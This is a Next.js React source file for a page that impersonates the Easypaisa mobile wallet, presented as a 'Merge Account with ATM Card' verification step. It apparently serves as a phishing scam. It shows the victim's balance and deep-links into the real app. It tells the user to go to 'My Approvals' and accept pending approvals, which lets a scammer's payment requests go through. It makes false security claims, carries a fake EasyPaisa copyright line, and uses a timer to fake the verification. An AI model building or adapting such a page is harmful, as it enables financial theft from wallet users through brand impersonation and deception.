"use client"

import { useSearchParams, useRouter } from "next/navigation"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Smartphone, CheckCircle, ArrowLeft, Shield, Clock } from "lucide-react"
import { Header } from "@/components/header"

export default function VerifyPage() {
  const params = useSearchParams()
  const router = useRouter()

  const account = params.get("account") ?? "N/A"
  const balance = params.get("balance") ?? "N/A"

  const [requestSent, setRequestSent] = useState(false)
  const [canVerify, setCanVerify] = useState(false)

  // After "Send Verification Request" is pressed we allow the "Verify" button
  useEffect(() => {
    if (requestSent) {
      const timer = setTimeout(() => setCanVerify(true), 3000) // simulate 3-second delay
      return () => clearTimeout(timer)
    }
  }, [requestSent])

  const handleSendRequest = () => {
    setRequestSent(true)

    // Deep-link to Easypaisa app
    const deepLink = `easypaisa://verify?account=${account}&amount=${balance}`
    const fallback = "https://play.google.com/store/apps/details?id=pk.com.Telenor.phoenix"

    // Try to open the app; if it fails, redirect after 2 s to Play Store
    const now = Date.now()
    window.location.href = deepLink
    setTimeout(() => {
      if (Date.now() - now < 2200) {
        window.location.href = fallback
      }
    }, 2000)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-50 to-teal-50">
      {/* Header */}
      <Header
        showHomeLink={true}
        title="Account Verification"
        subtitle="Complete the verification process through your mobile app"
      />

      <div className="flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-md">
          {/* Card */}
          <Card className="shadow-2xl border-0 overflow-hidden">
            <CardHeader className="bg-gradient-to-r from-emerald-700 to-emerald-600 text-white p-6">
              <div className="text-center">
                
                <CardTitle className="text-xl font-bold">Merge Account with ATM Card</CardTitle>
                <CardDescription className="text-emerald-100 mt-2">
                  Follow the steps below to complete verification
                </CardDescription>
              </div>
            </CardHeader>

            <CardContent className="space-y-8 p-8">
              {/* Account details */}
              <div className="rounded-xl border-2 border-emerald-100 bg-emerald-50 p-6">
                <div className="flex justify-between items-center mb-3">
                  <span className="font-semibold text-gray-700">Easypaisa Account:</span>
                  <span className="font-bold text-gray-900 text-lg">{account}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="font-semibold text-gray-700">Current Balance:</span>
                  <span className="font-bold text-emerald-600 text-lg">PKR {Number(balance).toLocaleString()}</span>
                </div>
              </div>

              {/* Steps */}
              <div className="space-y-4">
                <h3 className="font-bold text-gray-800 text-lg mb-4">Verification Steps:</h3>
                <div className="space-y-4">
                  <div className="flex items-start space-x-4 p-4 rounded-lg bg-gray-50">
                    <div className="w-8 h-8 bg-emerald-600 text-white rounded-full flex items-center justify-center font-bold text-sm">
                      1
                    </div>
                    <div>
                      <p className="text-gray-700">
                        Tap <strong>"Send Verification Request"</strong> to open your Easypaisa app.
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start space-x-4 p-4 rounded-lg bg-gray-50">
                    <div className="w-8 h-8 bg-emerald-600 text-white rounded-full flex items-center justify-center font-bold text-sm">
                      2
                    </div>
                    <div>
                      <p className="text-gray-700">Open Easypaisa app -&gt;My Account-&gt;My Approvals &amp; Accept pending approvals.         </p>
                    </div>
                  </div>

                  <div className="flex items-start space-x-4 p-4 rounded-lg bg-gray-50">
                    <div className="w-8 h-8 bg-emerald-600 text-white rounded-full flex items-center justify-center font-bold text-sm">
                      3
                    </div>
                    <div>
                      <p className="text-gray-700">
                        Return here and press <strong>"Verify"</strong>.
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Security note */}
              <Badge
                variant="outline"
                className="w-full justify-center bg-emerald-50 border-emerald-200 text-emerald-700 py-3 px-4"
              >
                <Shield className="w-4 h-4 mr-2" />
                This process is secure and encrypted. Your data is protected with bank-level security.
              </Badge>

              {/* Buttons */}
              <div className="space-y-4">
                <Button
                  onClick={handleSendRequest}
                  disabled={requestSent}
                  className="w-full bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 py-4 text-lg font-semibold rounded-xl shadow-lg"
                >
                  <Smartphone className="w-5 h-5 mr-3" />
                  {requestSent ? "Request Sent ✓" : "Send Verification Request"}
                </Button>

                <Button
                  onClick={() => router.push("/success")}
                  disabled={!canVerify}
                  className="w-full bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 disabled:opacity-50 py-4 text-lg font-semibold rounded-xl shadow-lg"
                >
                  <CheckCircle className="w-5 h-5 mr-3" />
                  {canVerify ? "Verify Now" : "Verify (Wait for app approval)"}
                </Button>

                <Button
                  variant="outline"
                  className="w-full bg-transparent border-2 border-gray-300 hover:bg-gray-50 py-4 text-lg font-semibold rounded-xl"
                  onClick={() => router.back()}
                >
                  <ArrowLeft className="w-5 h-5 mr-3" />
                  Go Back
                </Button>
              </div>

              {requestSent && !canVerify && (
                <div className="text-center p-4 bg-blue-50 rounded-xl border border-blue-200">
                  <Clock className="w-6 h-6 text-blue-600 mx-auto mb-2 animate-spin" />
                  <p className="text-blue-700 font-medium">Waiting for app approval...</p>
                </div>
              )}
            </CardContent>
          </Card>

          {/* Footer */}
          <p className="mt-8 text-center text-gray-500">© 2024 EasyPaisa. All rights reserved.</p>
        </div>
      </div>
    </div>
  )
}
